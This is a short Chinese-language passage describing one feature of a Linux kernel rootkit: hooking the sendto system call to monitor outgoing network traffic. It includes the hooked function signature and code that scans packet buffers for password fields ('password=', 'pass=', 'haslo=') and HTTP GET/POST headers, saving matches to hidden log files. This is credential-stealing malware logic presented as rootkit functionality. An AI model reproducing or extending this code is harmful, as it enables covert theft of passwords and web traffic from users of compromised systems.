## **功能7 监视网络发送**### packet记录模块rootkit通过设置钩子，钩住进程所调用的某些函数，对函数中的数据进行监视，并保存一些感兴趣的内容，比如http请求或者密码内容，将它们保存在指定的目录下。### 步骤：
监视网络发送 hook send系统调用
hook send函数
` long new_sys_sendto(int fd, void __user *buff_user, size_t len,unsigned int flags, struct sockaddr __user *addr, int addr_len)`
其中fd是文件描述符，通过文件描述符fd，找到对应的socket实例。

如果packet的长度为0或者没有成功执行拷贝操作则goto end。

否则，接下来

`password_found()`检查数据包内容是否包含密码

```if(strnstr(buf, "password=", size))
        return 1;
if (strnstr(buf, "pass=", size))
        return 1;
if (strnstr(buf, "haslo=", size)) //password in polish
        return 1;
    return 0;

```   

`http_header_found()`检查是否包含http头

```
 if (strnstr(buf, "POST /", size))
        return 1;
    if (strnstr(buf, "GET /", size))
        return 1;
    return 0;
```
    
如果包含密码或者http头，都将内容通过 `save_to_log()`保存至etc的相应文件etc/passwords和etc/http_requests。
